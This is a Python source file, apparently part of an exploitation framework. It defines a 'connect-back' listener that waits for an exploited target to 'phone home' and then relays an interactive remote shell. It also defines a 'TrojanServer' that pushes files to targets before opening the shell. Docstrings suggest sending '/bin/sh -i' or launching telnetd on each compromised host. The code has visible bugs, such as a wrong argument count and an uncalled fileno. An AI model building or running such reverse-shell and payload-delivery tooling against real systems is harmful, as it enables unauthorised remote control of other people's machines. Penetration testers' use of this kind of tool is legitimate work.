import signal
import socket
import sys
import os
import select
import traceback

class ConnectbackServer(object):
    """
    A connect-back server class.
    
    This class provides a server that waits for an incoming connection from a
    connect-back payload and provides an interactive shell.  Think "netcat
    listener" that has an API and can be used programmatically.
    """
    MAX_READ=1024
    def __init__(self,connectback_host,startcmd=None,connectback_shell=True):
        """
        Class constructor.
        
        Parameters
        ----------
        callback_ip: the address this server should bind to.
        port: Optional. The port this server should bind to.  Default value is
            8080.
        startcmd: Optional.  A command string to issue to the remote host upon
            connecting.  This could be a command to restart the exploited
            service, or to customize the interactive shell, e.g., '/bin/sh -i'.
        connectback_shell: Optional.  This argument defaults to True, which is
            99% of the time is what you need.  See note.
        
        Note
        ----
        If, say, you wanted to non-interactively exploit a target (or multiple
        targets) and automatically kick off a telnet sever on each one, then,
        for each exploited target, you could construct a ConnectbackServer like
        so:
            server=ConnectbackServer(connectback_host,startcmd='/sbin/telnetd',connectback_shell=False)
        """
        self.callback_ip=connectback_host.callback_ip
        self.port=connectback_host.port
        self.startcmd=startcmd
        self.connectback_shell=connectback_shell

    def handler(self,signum,frame):
        print >>sys.stderr,"signal num %d\n"%signum
        self.keepgoing=False

    def server(self):
        serversocket = socket.socket(
                socket.AF_INET,socket.SOCK_STREAM)
        serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        serversocket.bind((self.callback_ip,int(self.port)))
        serversocket.listen(5)
        return serversocket
        
    def exit(self):
        #this prevents a hang in mod_wsgi, which traps sys.exit()
        os.execv("/bin/true",["/bin/true"])

    def __serve_connectback_shell(self):
        max_read=self.__class__.MAX_READ
        signal.signal(signal.SIGINT,self.handler)
        signal.signal(signal.SIGTERM,self.handler)
        server_socket=self.server(self.port)
        print >>sys.stderr,"Listening on port %d\n" % int(self.port)
        print >>sys.stderr,"Waiting for incoming connection.\n"
        self.keepgoing=True
        
        try:
            (clientsocket,addess) = server_socket.accept()
        except Exception as e:
            server_socket.shutdown(socket.SHUT_RDWR)
            server_socket.close()
            return

        print "Target has phoned home.\n"
        fd_to_file={clientsocket.fileno:clientsocket,sys.stdin.fileno():sys.stdin}
        inputlist=[clientsocket,sys.stdin]
        
        
        if None != self.startcmd:
            clientsocket.send(self.startcmd+"\n")
        #clientsocket.send("exec /bin/sh -i\n")
        
        while self.keepgoing==True:
            try:
                inp,outp,excep=select.select(inputlist,[],[])
                for f in inp:
                    if f is clientsocket:
                        data=f.recv(max_read)
                        if data:
                            sys.stdout.write(data)
                            sys.stdout.flush()
                    else:
                        data=sys.stdin.readline()
                        if data:
                            clientsocket.send(data)

            except Exception as e:
                #print traceback.format_exc()
                print >>sys.stderr,str(e)
                self.keepgoing=False
                print >>sys.stderr,""
                print >>sys.stderr,"Closing connection.\n"
                clientsocket.shutdown(socket.SHUT_RDWR)
                clientsocket.close()
                server_socket.shutdown(socket.SHUT_RDWR)
                server_socket.close()

        print >>sys.stderr,"Exiting\n"
        self.exit()
        

    def serve_connectback(self):
        if self.connectback_shell:
            pid=os.fork()
            if pid and pid > 0:
                return pid
            else:
                #no return
                self.__serve_connectback_shell()
        else:
            return None
   

class TrojanServer(ConnectbackServer):
    def __init__(self,connectback_host,files_to_serve,connectback_shell=False):
        super(self.__class__,self).__init__(connectback_host)
        self.files_to_serve=files_to_serve
        self.connectback_shell=connectback_shell
    
   
    def serve_file_to_client(self,filename,serversocket):
        data=open(filename,"r").read();
        (clientsocket,address) = serversocket.accept()
        clientsocket.send(data)
        
        clientsocket.shutdown(socket.SHUT_RDWR)
        clientsocket.close()
    

    def serve_callback(self):
        pid=os.fork()
        if 0!=pid:
            return pid

        serversocket=self.server(self.port)
        for _file in self.files_to_serve:
            print "Waiting to send file: %s\n" % _file
            self.serve_file_to_client(_file,serversocket)
            print "\nDone with file: %s\n"%_file
        
        serversocket.shutdown(socket.SHUT_RDWR)
        serversocket.close()
        
        if self.connectback_shell == True:
            print "Serving callback_shell."
            #no return
            self.__serve_connectback_shell()

            


